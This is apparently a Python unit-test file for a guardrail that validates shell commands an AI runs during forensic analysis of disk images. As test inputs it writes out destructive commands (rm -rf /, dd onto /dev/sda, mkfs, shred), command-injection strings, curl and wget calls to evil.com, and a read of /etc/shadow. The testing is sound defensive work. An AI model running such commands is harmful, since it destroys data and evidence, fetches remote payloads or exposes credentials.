"""Tests for architectural guardrails - the most critical security component."""

import unittest
from mcp_server.guardrails import ForensicGuardrails


class TestGuardrails(unittest.TestCase):

    def setUp(self):
        self.g = ForensicGuardrails()

    # ---- Blocked commands should be caught ----

    def test_blocks_rm_rf(self):
        self.assertIsNotNone(self.g.validate_command("rm -rf /"))

    def test_blocks_rm_rf_cases(self):
        self.assertIsNotNone(self.g.validate_command("rm -rf /cases/evidence"))

    def test_blocks_mkfs(self):
        self.assertIsNotNone(self.g.validate_command("mkfs.ext4 /dev/sda1"))

    def test_blocks_dd_write(self):
        self.assertIsNotNone(self.g.validate_command("dd if=/dev/zero of=/dev/sda"))

    def test_blocks_shred(self):
        self.assertIsNotNone(self.g.validate_command("shred /cases/evidence.E01"))

    def test_blocks_mount_rw(self):
        self.assertIsNotNone(self.g.validate_command("mount -o rw /dev/sda1 /mnt"))

    def test_blocks_chmod_777(self):
        self.assertIsNotNone(self.g.validate_command("chmod 777 /cases"))

    def test_blocks_fdisk(self):
        self.assertIsNotNone(self.g.validate_command("fdisk /dev/sda"))

    def test_blocks_wipefs(self):
        self.assertIsNotNone(self.g.validate_command("wipefs -a /dev/sda"))

    # ---- Injection detection ----

    def test_blocks_pipe_to_rm(self):
        self.assertIsNotNone(self.g.validate_command("cat /etc/passwd | rm -rf /"))

    def test_blocks_semicolon_rm(self):
        self.assertIsNotNone(self.g.validate_command("ls; rm -rf /cases"))

    def test_blocks_subshell_dd(self):
        self.assertIsNotNone(self.g.validate_command("echo $(dd if=/dev/zero of=/dev/sda)"))

    # ---- Allowed forensic commands ----

    def test_allows_fls(self):
        self.assertIsNone(self.g.validate_command("fls -r -o 2048 /cases/test.E01"))

    def test_allows_mmls(self):
        self.assertIsNone(self.g.validate_command("mmls /cases/test.E01"))

    def test_allows_icat(self):
        self.assertIsNone(self.g.validate_command("icat -o 2048 /cases/test.E01 12345"))

    def test_allows_strings(self):
        self.assertIsNone(self.g.validate_command("strings -n 6 /cases/test.E01"))

    def test_allows_grep(self):
        self.assertIsNone(self.g.validate_command("grep -r password /mnt/windows_mount"))

    def test_allows_md5sum(self):
        self.assertIsNone(self.g.validate_command("md5sum /cases/test.E01"))

    def test_allows_file(self):
        self.assertIsNone(self.g.validate_command("file /cases/suspicious.exe"))

    def test_allows_find(self):
        self.assertIsNone(self.g.validate_command("find /cases -name '*.evtx'"))

    # ---- Binary whitelist ----

    def test_blocks_unknown_binary(self):
        self.assertIsNotNone(self.g.validate_command("malware.exe /cases/test"))

    def test_blocks_curl(self):
        self.assertIsNotNone(self.g.validate_command("curl http://evil.com"))

    def test_blocks_wget(self):
        self.assertIsNotNone(self.g.validate_command("wget http://evil.com/payload"))

    # ---- Path boundaries ----

    def test_blocks_etc_access(self):
        v = self.g.validate_command("cat /etc/shadow")
        # cat is allowed binary, but /etc/shadow is outside allowed paths
        self.assertIsNotNone(v)

    def test_allows_cases_path(self):
        self.assertIsNone(self.g.validate_command("ls /cases"))

    def test_allows_mnt_path(self):
        self.assertIsNone(self.g.validate_command("ls /mnt/windows_mount"))

    def test_allows_tmp_findevil(self):
        self.assertIsNone(self.g.validate_command("ls /tmp/findevil/recovered"))

    # ---- Output sanitization ----

    def test_sanitize_short_output(self):
        text = "short output"
        self.assertEqual(self.g.sanitize_for_llm(text), text)

    def test_sanitize_long_output(self):
        text = "x" * 100_000
        result = self.g.sanitize_for_llm(text, max_chars=1000)
        self.assertLess(len(result), len(text))
        self.assertIn("TRUNCATED", result)

    def test_output_size_check(self):
        self.assertTrue(self.g.validate_output_size(b"small"))
        self.assertFalse(self.g.validate_output_size(b"x" * 20_000_000))


class TestGuardrailsCustomConfig(unittest.TestCase):

    def test_custom_allowed_paths(self):
        g = ForensicGuardrails({"allowed_paths": ["/evidence", "/tmp"]})
        self.assertIsNone(g.validate_command("ls /evidence/case1"))
        self.assertIsNotNone(g.validate_command("ls /cases/test"))

    def test_custom_blocked_commands(self):
        g = ForensicGuardrails({"blocked_commands": ["custom_danger"]})
        self.assertIsNotNone(g.validate_command("custom_danger --force"))


if __name__ == "__main__":
    unittest.main()
